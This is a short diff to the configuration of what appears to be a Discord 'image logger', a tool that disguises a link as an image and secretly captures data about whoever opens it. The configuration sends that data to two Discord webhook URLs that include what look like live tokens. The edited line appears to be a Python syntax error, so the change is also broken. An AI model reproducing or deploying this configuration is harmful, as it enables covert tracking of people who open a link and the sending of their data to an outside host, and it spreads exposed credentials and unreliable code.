@@ -9,7 +9,7 @@ __author__ = "Sami"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1339666771057180725/FEG9VzLd-kv7hB3Xq28ieyEWV5UQBPJreMR95DmQRsPOdLN6_FquP726d7fIO7OJ8lSs,https://discord.com/api/webhooks/1341756404582711367/bfiwTBxCj-fpMfKmWW-0ZAVVGbt57sEjtyTYSSOJ72sBqWRQJpiHPd-xOj3tIbnoaSyq",
+    "webhook": "https://discord.com/api/webhooks/1339666771057180725/FEG9VzLd-kv7hB3Xq28ieyEWV5UQBPJreMR95DmQRsPOdLN6_FquP726d7fIO7OJ8lSs","https://discord.com/api/webhooks/1341756404582711367/bfiwTBxCj-fpMfKmWW-0ZAVVGbt57sEjtyTYSSOJ72sBqWRQJpiHPd-xOj3tIbnoaSyq",
     "image": "https://www.computercraft.com/photo/dumbtermdim.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
